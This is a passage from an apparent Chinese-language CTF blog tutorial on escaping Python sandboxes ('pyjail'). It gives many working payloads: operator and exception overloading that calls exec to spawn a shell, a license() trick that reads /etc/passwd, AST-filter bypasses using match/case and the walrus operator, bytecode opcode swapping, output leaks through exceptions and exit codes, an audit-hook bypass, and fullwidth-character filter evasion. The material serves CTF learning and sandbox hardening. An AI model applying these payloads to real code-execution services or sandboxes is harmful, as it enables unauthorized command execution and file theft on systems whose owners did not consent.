__lt__ (k &lt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__le__ (k &lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__eq__ (k == &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ne__ (k != &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ge__ (k &gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__gt__ (k &gt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iadd__ (k += &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__isub__ (k -= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__imul__ (k *= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ifloordiv__ (k //= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__idiv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__itruediv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;) (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ipow__ (k **= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ilshift__ (k&lt;&lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__irshift__ (k &gt;&gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iand__ (k = &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ior__ (k |= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ixor__ (k ^= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</code></pre>
<p>示例:</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __sub__ = exec
    
class Sub(metaclass=Metaclass):
    pass

Sub-&#x27;import os; os.system(&quot;sh&quot;)&#x27;</code></pre>
<p><strong>exceptions 利用</strong></p>
<p>利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:</p>
<pre><code class="highlight plaintext">class RCE(Exception):
    def __init__(self):
        self += &#x27;import os; os.system(&quot;sh&quot;)&#x27;
    __iadd__ = exec 
    
raise RCE</code></pre>
<p>raise 会进入 RCE 的 <code>__init__</code>, 然后触发 <code>__iadd__</code> 也就是 exec.</p>
<p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p>
<pre><code class="highlight plaintext">class X:
    def __init__(self, a, b, c):
        self += &quot;os.system(&#x27;sh&#x27;)&quot;
    __iadd__ = exec
sys.excepthook = X
1/0</code></pre>
<p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p>
<pre><code class="highlight plaintext">class X():
  def __init__(self, a, b, c, d, e):
    self += &quot;print(open(&#x27;flag&#x27;).read())&quot;
  __iadd__ = eval
__builtins__.__import__ = X
&#123;&#125;[1337]</code></pre>
<p>这个 payload 将 <code>__import__</code> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <code>__import__</code>.</p>
<h5 id="通过-license-函数读取文件"><a class="markdownIt-Anchor" href="#通过-license-函数读取文件"></a> 通过 license 函数读取文件</h5>
<pre><code class="highlight plaintext">__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>
<p>上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用 <code>license()</code> 时会打印这个文件的内容.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&quot;license&quot;]._Printer__filenames
[&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/../LICENSE&#x27;, &#x27;/usr/lib/python3.11/LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/LICENSE&#x27;, &#x27;./LICENSE.txt&#x27;, &#x27;./LICENSE&#x27;]</code></pre>
<p>payload 中将 help 类的 <code>__enter__</code> 方法覆盖为 <code>license</code> 方法, 而 with 语句在创建上下文时会调用 help 的<code>__enter__</code>, 从而执行 <code>license</code> 方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的. 例如:</p>
<pre><code class="highlight plaintext">class MyContext:
    pass
    
__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = MyContext()
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>
<h4 id="打印-ast"><a class="markdownIt-Anchor" href="#打印-ast"></a> 打印 AST</h4>
<pre><code class="highlight plaintext">import os
import ast 

BAD_ATS = &#123;
  ast.Attribute,
  ast.AST,
  ast.Subscript,
  ast.comprehension,
  ast.Delete,
  ast.Try,
  ast.For,
  ast.ExceptHandler,
  ast.With,
  ast.Import,
  ast.ImportFrom,
  ast.Assign,
  ast.AnnAssign,
  ast.Constant,
  ast.ClassDef,
  ast.AsyncFunctionDef,
&#125;

a = &#x27;&#x27;&#x27;
[
    system:=111,
    bash:=222
]
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))


for x in ast.walk(compile(a, &quot;&lt;QWB7th&gt;&quot;, &quot;exec&quot;, flags=ast.PyCF_ONLY_AST)):
  if type(x) in BAD_ATS:
    print(type(x))
    exit()

print(&quot;[+] OK&quot;)</code></pre>
<h4 id="绕过-astattribute-获取属性"><a class="markdownIt-Anchor" href="#绕过-astattribute-获取属性"></a> 绕过 ast.Attribute 获取属性</h4>
<p>如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。</p>
<p>最简单的示例，匹配字符串：</p>
<pre><code class="highlight plaintext">item = 2

match item:
    case 1:
        print(&quot;One&quot;)
    case 2:
        print(&quot;Two&quot;)

# Two</code></pre>
<p>还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。</p>
<pre><code class="highlight plaintext">item = (1, 2)

match item:
    case (x, y, z):
        print(f&quot;&#123;x&#125; &#123;y&#125; &#123;z&#125;&quot;)
    case (x, y):
        print(f&quot;&#123;x&#125; &#123;y&#125;&quot;)
    case (x,):
        print(f&quot;&#123;x&#125;&quot;)</code></pre>
<p>对于基本类型的匹配比较好理解，下面是一个匹配类的示例：</p>
<pre><code class="highlight plaintext">class AClass:
    def __init__(self, value):
        self.thing = value

item = AClass(32)

match item:
    case AClass(thing=x):
        print(f&quot;Got &#123;x = &#125;!&quot;)

# Got x = 32!</code></pre>
<p>在这个示例中，重点关注<code>case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 <code>AClass</code> 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</p>
<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code>''.__class__</code>，可以编写如下的 match/case 语句：</p>
<pre><code class="highlight plaintext">match str():
    case str(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>
<p>可以看到 x 就是 <code>''.__class__</code>. 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>
<p>再测试一下该 payload 的 AST：</p>
<pre><code class="highlight plaintext">import os
import ast 

a = &#x27;&#x27;&#x27;
match str():
    case str(__class__=x):
        print(x)
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))</code></pre>
<p>AST 如下：</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Match(
            subject=Call(
                func=Name(id=&#x27;str&#x27;, ctx=Load()),
                args=[],
                keywords=[]),
            cases=[
                match_case(
                    pattern=MatchClass(
                        cls=Name(id=&#x27;str&#x27;, ctx=Load()),
                        patterns=[],
                        kwd_attrs=[
                            &#x27;__class__&#x27;],
                        kwd_patterns=[
                            MatchAs(name=&#x27;x&#x27;)]),
                    body=[
                        Expr(
                            value=Call(
                                func=Name(id=&#x27;print&#x27;, ctx=Load()),
                                args=[
                                    Name(id=&#x27;x&#x27;, ctx=Load())],
                                keywords=[]))])])],
    type_ignores=[])</code></pre>
<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>
<p>我们可以构造替代 <code>''.__class__.__base__.__subclasses__()</code>的 payload：</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=clazz):
        match clazz:
            case object(__base__=bass):
                match bass:
                    case object(__subclasses__=subclazz):
                        print(subclazz)</code></pre>
<h4 id="绕过-astassign-赋值变量"><a class="markdownIt-Anchor" href="#绕过-astassign-赋值变量"></a> 绕过 ast.Assign 赋值变量</h4>
<p>ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
<pre><code class="highlight plaintext">[
    system:=111,
    bash:=222
]</code></pre>
<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Expr(
            value=List(
                elts=[
                    NamedExpr(
                        target=Name(id=&#x27;system&#x27;, ctx=Store()),
                        value=Constant(value=111)),
                    NamedExpr(
                        target=Name(id=&#x27;bash&#x27;, ctx=Store()),
                        value=Constant(value=222))],
                ctx=Load()))],
    type_ignores=[])</code></pre>
<h4 id="绕过-astconstant-获取数字-字符串"><a class="markdownIt-Anchor" href="#绕过-astconstant-获取数字-字符串"></a> 绕过 ast.Constant 获取数字、字符串</h4>
<p>题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。 例如：</p>
<pre><code class="highlight plaintext">&quot;&quot; : str()
0  : len([])
&quot;0&quot;: str(len([]))
&quot;1&quot;: str(len([str()])) 或 str(len([min]))
&quot;2&quot;: str(len([str(),str()])) 或 str(len([min,max]))
&#x27;A&#x27;: chr(len([min,min,min,min,min])*len([min,min,min,min,min,min,min,min,min,min,min,min,min]))</code></pre>
<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。</p>
<p>当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：<a target="_blank" rel="noopener" href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 绕过基于字符串匹配的过滤</a> 中有提到过。</p>
<p>在这个 payload 中，需要构造出 _wrap_close、system、bash</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>
<p>那么就可以通过下面的方式获取到这几个字符串：</p>
<pre><code class="highlight plaintext">list(dict(system=[]))[0]            # system
list(dict(_wrap_close=[]))[0]       # _wrap_close
list(dict(bash=[]))[0]              # bash</code></pre>
<h4 id="绕过-astsubscript-获取列表字典元素"><a class="markdownIt-Anchor" href="#绕过-astsubscript-获取列表字典元素"></a> 绕过 ast.Subscript 获取列表/字典元素</h4>
<p>题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
<pre><code class="highlight plaintext">min(list(dict(system=[])))            # system
min(list(dict(_wrap_close=[])))       # _wrap_close
min(list(dict(bash=[])))              # bash</code></pre>
<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。</p>
<pre><code class="highlight plaintext">match globals:
    case object(get=get_func):
        get_func(&quot;system&quot;)</code></pre>
<h4 id="绕过-astfor-遍历列表"><a class="markdownIt-Anchor" href="#绕过-astfor-遍历列表"></a> 绕过 ast.For 遍历列表</h4>
<p>在构造最终 payload 中，我们还需要在 <code>__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>
<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：</p>
<pre><code class="highlight plaintext">def filter_func(subclazzes_item):
    [ _wrap_close:=min(list(dict(_wrap_close=[])))]
    match subclazzes_item:
        case object(_＿name_＿=name):
            if name==_wrap_close:
                return subclazzes_item
[
    subclazzes_item:=min(filter(filter_func,subclazzes()))
]</code></pre>
<p>fitler 中使用 match/case 和 if 来进行过滤。</p>
<p>除了使用 filter 函数外，还可以使用<code> iter</code> 和 <code>next</code> 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>
<h4 id="绕过astgeneratorexp获取生成器栈帧"><a class="markdownIt-Anchor" href="#绕过astgeneratorexp获取生成器栈帧"></a> 绕过<code>ast.GeneratorExp</code>获取生成器栈帧</h4>
<p>思路来自于 [<a target="_blank" rel="noopener" href="https://maplebacon.org/2024/02/dicectf2024-irs/">DiceCTF 2024] IRS</a></p>
<p>payload 如下，且 AST 中不会出现 <code>ast.GeneratorExp</code>。</p>
<pre><code class="highlight plaintext">def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame)</code></pre>
<p>如何理解这段代码：</p>
<ol>
<li>首先声明了一个生成器 f，
<ol>
<li>f 内部声明了全局变量 x 和 frame，意味着会在函数外部对其进行操作。</li>
</ol>
</li>
<li>x = f() 会实例化一个生成器，但由于生成器的延迟加载，此时生成器不会执行。</li>
<li>x.send(None)：这行代码启动了生成器，并让它执行到第一个 yield 语句。</li>
</ol>
<p>测试代码如下：</p>
<pre><code class="highlight plaintext">import ast

flag = &quot;flag&#123;12345&#125;&quot;
code = &#x27;&#x27;&#x27;
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame.f_globals)
&#x27;&#x27;&#x27;

print(ast.dump(ast.parse(code, mode=&#x27;exec&#x27;), indent=4))
root = ast.parse(code)
compiled_code = compile(code,&quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)
# 又是一段严防死守的过滤
exec(
    compiled_code,
    None,   # globals，也可能是其他值
    None    # locals，也可能是其他值
)</code></pre>
<h3 id="opcode"><a class="markdownIt-Anchor" href="#opcode"></a> <code>OPcode</code></h3>
<p>见过pickle的大概都知道OPcode是个什么东西</p>
<blockquote>
<p>opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。</p>
</blockquote>
<p>那么如何查看一个函数的opcode呢，写个例子看看先</p>
<pre><code class="highlight plaintext">import dis

code_str = &#x27;print(&quot;a&quot;)&#x27;
code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250704170021243.png" alt="image-20250704170021243"></p>
<h4 id="import_from-load_attr-相互替换"><a class="markdownIt-Anchor" href="#import_from-load_attr-相互替换"></a> IMPORT_FROM、LOAD_ATTR 相互替换</h4>
<p>思路来自于:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://sekai.team/blog/lactf-2023/pycjail">LA CTF 2023 – Pycjail  Project SEKAI</a></li>
<li><a target="_blank" rel="noopener" href="https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak">TI-1337 Plus CE: Abusing CPython internals  kmh’s blog</a></li>
</ul>
<p>LOAD_ATTR 可以和 IMPORT_FROM 直接替换。</p>
<h4 id="load_name-load_attr"><a class="markdownIt-Anchor" href="#load_name-load_attr"></a> LOAD_NAME &amp; LOAD_ATTR</h4>
<p>LOAD_ATTR 是用来从对象中获取属性的字节码指令。它通常用于从一个已经加载到栈上的对象（如模块或类实例）中获取某个属性。</p>
<p>例如导入 os.system 函数</p>
<pre><code class="highlight plaintext">import os
os.system</code></pre>
<p>对应的字节码如下，其中最为关键的就是 LOAD_NAME 和 LOAD_ATTR。</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (os)
              6 STORE_NAME               0 (os)

  3           8 LOAD_NAME                0 (os)
             10 LOAD_ATTR                1 (system)
             12 POP_TOP
             14 LOAD_CONST               1 (None)
             16 RETURN_VALUE

consts:  (0, None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c005a0065006a01010064015300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
5a00 -&gt; STORE_NAME, names[0] -&gt; os
6500 -&gt; LOAD_NAME, names[0] -&gt; os
6a01 -&gt; LOAD_ATTR, names[1] -&gt; system
0100 -&gt; POP_TOP
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>
<h4 id="import_name-import_from"><a class="markdownIt-Anchor" href="#import_name-import_from"></a> IMPORT_NAME &amp; IMPORT_FROM</h4>
<p>如果使用 from 来进行函数导入:</p>
<pre><code class="highlight plaintext">from os import sys</code></pre>
<p>得到的字节码信息如下，可以看到使用的是 IMPORT_NAME 和 IMPORT_FROM 组合</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 ((&#x27;system&#x27;,))
              4 IMPORT_NAME              0 (os)
              6 IMPORT_FROM              1 (system)
              8 STORE_NAME               1 (system)
             10 POP_TOP
             12 LOAD_CONST               2 (None)
             14 RETURN_VALUE

consts:  (0, (&#x27;system&#x27;,), None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c006d015a01010064025300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; (&#x27;system&#x27;,)
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
6d01 -&gt; IMPORT_FROM, names[1] -&gt; system
5a01 -&gt; STORE_NAME, arg -&gt; 1
0100 -&gt; POP_TOP
6402 -&gt; LOAD_CONST, consts[2] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>
<h4 id="替换字节码"><a class="markdownIt-Anchor" href="#替换字节码"></a> 替换字节码</h4>
<p>在 LACTF 2023 Pycjail 这道题的场景中，用户输入的 const、names、code 最终会替换到题目中的一个空函数中并执行。排除掉题目其他的过滤，大致的逻辑如下：</p>
<ol>
<li>填充 f 函数 co_consts、co_names、co_code</li>
<li>然后执行函数。</li>
</ol>
<p>测试代码如下：</p>
<pre><code class="highlight plaintext">def f():
    pass

f.__code__ = f.__code__.replace(
    co_stacksize=10,
    co_consts=(&quot;a&quot;, 139, &quot;system&quot;, &quot;dir&quot;),
    co_names=tuple(&quot;__class__,__base__,__subclasses__,__init__,__globals__&quot;.split(&quot;,&quot;)),
    co_code=bytes.fromhex(trans_bytes(&quot;64006a006a01a002a100640119006a036a046402190064038301010064045300&quot;)),
)


print(&quot;here goes!&quot;)
frame = inspect.currentframe()
p = print
r = repr
for k in list(frame.f_globals):
    if k not in (&quot;p&quot;, &quot;r&quot;, &quot;f&quot;):
        del frame.f_globals[k]

p(r(f()))</code></pre>
<p>我们可以使用下面的脚本来生成 payload，我本地的 <code>_wrap_close</code> 的索引为 139.</p>
<pre><code class="highlight plaintext">import dis
import inspect
from test_opcode_display import display_opcode_py310
code_str = &#x27;&#x27;&#x27;
&#x27;a&#x27;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;dir&#x27;)
&#x27;&#x27;&#x27;

code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())

# 64006d006d01a002a100640119006d036d046402190064038301010064045300</code></pre>
<p>LOAD_ATTR 对应操作码 6a，IMPORT_FROM 对应字节码为 6d，当我将 6a 直接替换为 6d 时，居然能够正常执行！</p>
<h3 id="无回显"><a class="markdownIt-Anchor" href="#无回显"></a> 无回显</h3>
<p>在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。</p>
<p>以<code> AmateursCTF</code> 2023 的一道题目为例，题目的源码如下：</p>
<pre><code class="highlight plaintext">#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input(&quot;Give code: &quot;))
            if &quot;flag&quot; in code or &quot;e&quot; in code or &quot;t&quot; in code or &quot;\\&quot; in code:
                raise ValueError(&quot;invalid input&quot;)
            exec(eval(code))
        except Exception as err:
            print(err)</code></pre>
<p>在这道题中，首先通过 ascii 将输入进行转化，使用 ascii 后，即使 unicode，也会被转化为 \u00xx 的形式。然后判断输入中是否出现了 flag、e、t、以及 \。这样的过滤条件基本将 unicode 绕过的方式给限制住了。过滤了 e 和 t， print、help 等输出函数也会被过滤， 而题目使用 exec 来执行 python 代码，因此除了绕过过滤之外，还需要考虑如何获取输出。</p>
<p>注意到这道题添加了一个异常处理，如果 exec 中出现错误，则会将错误信息打印出来，借助异常处理的输出，就可以将 Python 中的一些内部变量给带出来。</p>
<h4 id="利用异常处理"><a class="markdownIt-Anchor" href="#利用异常处理"></a> 利用异常处理</h4>
<p>作为客户端输入，结合当前读取变量的场景，python 中可利用的一些异常大多为：</p>
<ul>
<li><code>KeyError</code>（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用）</li>
<li><code>FileNotFoundError</code>（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。</li>
<li><code>ValueError</code>（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。</li>
</ul>
<p>这道题中 _ 与 flag 的值一致，因此我们只需要获取变量 _ 就可以获取 flag。</p>
<h5 id="keyerror"><a class="markdownIt-Anchor" href="#keyerror"></a> <code>KeyError</code></h5>
<p><code>KeyError</code> 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。比如在这道题中输入：</p>
<pre><code class="highlight plaintext">Give code: &#123;&quot;1&quot;:&quot;2&quot;&#125;[_]
&#x27;flag&#123;xxxx&#125;&#x27;</code></pre>
<h5 id="filenotfounderror"><a class="markdownIt-Anchor" href="#filenotfounderror"></a> FileNotFoundError</h5>
<p><code>FileNotFoundError </code>出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。</p>
<p>但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉。</p>
<pre><code class="highlight plaintext">Give code: open(_)
[Errno 2] No such file or directory: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>
<h5 id="valueerror"><a class="markdownIt-Anchor" href="#valueerror"></a> ValueError</h5>
<p><code>ValueError </code>比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如：</p>
<pre><code class="highlight plaintext">Give code: int(_)
ValueError: invalid literal for int() with base 10: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>
<p>当然这里过滤了 t，int 函数无法使用，可以去寻找一些别的函数。</p>
<h5 id="popenreturncode"><a class="markdownIt-Anchor" href="#popenreturncode"></a> Popen.returncode</h5>
<p>在 aliyunCTF 2025 ezoj 这道题中，给出了一个使用 subprocess.Popen 执行 python 脚本，但无回显的情况，</p>
<pre><code class="highlight plaintext">process = subprocess.Popen(
    [&quot;python3&quot;, code_filename],
    stdin=infile,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)

try:
    stdout, stderr = process.communicate(timeout=5)
except subprocess.TimeoutExpired:
    process.kill()
    raise OJTimeLimitExceed

if process.returncode != 0:
    raise OJRuntimeError(process.returncode)</code></pre>
<p>但是题目给了一个 OJRuntimeError，并且传入了 returncode 属性。returncode 属性用于保存子进程退出时返回的退出码，反映了子进程是在正常结束还是在运行过程中出现异常。</p>
<p>这道题会将错误码发送给客户端：</p>
<pre><code class="highlight plaintext">except OJRuntimeError as e:
    return &#123;&quot;status&quot;: &quot;RE&quot;, &quot;message&quot;: f&quot;Runtime Error: ret=&#123;e.args[0]&#125;&quot;&#125;</code></pre>
<p><code>returncode</code> 的可能取值有以下几种</p>
<ul>
<li>None：表示子进程尚未终止，此时 returncode 还没有被赋值。</li>
<li>0：表示子进程成功结束，没有发生错误。</li>
<li>正整数：表示子进程执行时出现了错误，返回码通常会反映错误类型或状态码。</li>
<li>负整数：（仅在 POSIX 系统中）表示子进程被某个信号强制终止，其数值通常为 -N，其中 N 是引起终止的信号编号。</li>
</ul>
<p>由于 ascii 也是 0-255，借助这个 returncode 就可以实现回显，但 returncode 仅有一位，所以需要逐位回显。</p>
<pre><code class="highlight plaintext">import sys
...

content_len = len(content)
if &#123;loc&#125; &lt; content_len:
    sys.exit(content[&#123;loc&#125;])
else:
    sys.exit(255)</code></pre>
<h3 id="钩子爹来咯"><a class="markdownIt-Anchor" href="#钩子爹来咯"></a> 钩子爹来咯!</h3>
<p>钩子是什么?<s>钩子就是钩子啊</s></p>
<blockquote>
<p><strong>Audit Hook</strong>审计钩子是Python3.8开始引入的一项安全功能旨在让 Python 运行时的操作对外部监控工具可见。该功能允许开发者通过注册钩子函数来监控和控制特定的事件，尤其是与安全相关的操作。这种机制为系统管理员、测试人员和安全专家提供了一个有效的手段来检测、记录或阻止特定操作。</p>
<p>审计钩子通过 <code>sys.addaudithook()</code> 函数添加。每当发生特定事件时，Python会调用这些钩子函数，并将事件名称和相关参数传递给它们。钩子函数可以选择记录这些事件，或者在检测到不允许的操作时抛出异常，从而阻止操作继续进行。</p>
</blockquote>
<p>而发生审计事件时，Python就会调用这些钩子</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li><code>import</code>：发生在导入模块时。</li>
<li><code>open</code>：发生在打开文件时。</li>
<li><code>write</code>：发生在写入文件时。</li>
<li><code>exec</code>：发生在执行Python代码时。</li>
<li><code>compile</code>：发生在编译Python代码时。</li>
<li><code>socket</code>：发生在创建或使用网络套接字时。</li>
<li><code>os.system</code>，<code>os.popen</code>等：发生在执行操作系统命令时。</li>
<li><code>subprocess.Popen</code>，<code>subprocess.run</code>等：发生在启动子进程时</li>
</ul>
<p>所有的事件列表可见：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/audit_events.html">Audit events table — Python 3.13.0 documentation</a></li>
<li><a target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/">PEP 578 – Python Runtime Audit Hooks</a></li>
</ul>
<p>你可以定义一个函数</p>
<pre><code class="highlight plaintext">def waf(event,args):
	if not event in [&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:
		raise Exception(&quot;Errror&quot;)
sys.addaudithook(waf)</code></pre>
<p>接着之后的代码一旦不在白名单内就会<code>raise Exception</code></p>
<h4 id="篡改内置函数"><a class="markdownIt-Anchor" href="#篡改内置函数"></a> 篡改内置函数</h4>
<h3 id="乱七八糟的waf"><a class="markdownIt-Anchor" href="#乱七八糟的waf"></a> 乱七八糟的WAF</h3>
<h4 id="过滤import"><a class="markdownIt-Anchor" href="#过滤import"></a> 过滤import</h4>
<p><strong><code>__import__</code></strong></p>
<p>除了可以使用 import，还可以使用 <code>__import__</code>和 <code>importlib.import_module</code>来导入模块<br>
<code>importlib </code>需要进行导入后才能够使用</p>
<p>还可以使用<code>execfile</code></p>
<pre><code class="highlight python"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)
importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)

<span class="comment">#py2</span>
execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)

<span class="comment">#py3</span>
<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
    <span class="built_in">exec</span>(f.read())
    <span class="comment">#这个是需要事先知道路径的，要用sys.path(if)去事先试探一下</span></code></pre>
<p><strong><code>__loader__</code></strong></p>
<p><code>__loader__.load_module</code>底层实现与 import 不同, 可以绕过audithook</p>
<pre><code class="highlight plaintext">__loader__.load_module(&#x27;os&#x27;)</code></pre>
<h4 id="过滤字母"><a class="markdownIt-Anchor" href="#过滤字母"></a> 过滤字母</h4>
<p>可以用全角字符绕过半角字符</p>
<pre><code class="highlight plaintext">def halfwidth_to_fullwidth(text):
    &quot;&quot;&quot;将半角字符转换为全角字符&quot;&quot;&quot;
    result = []
    for char in text:
        code = ord(char)
        if code == 0x20:  # 半角空格 → 全角空格
            result.append(&#x27;\u3000&#x27;)
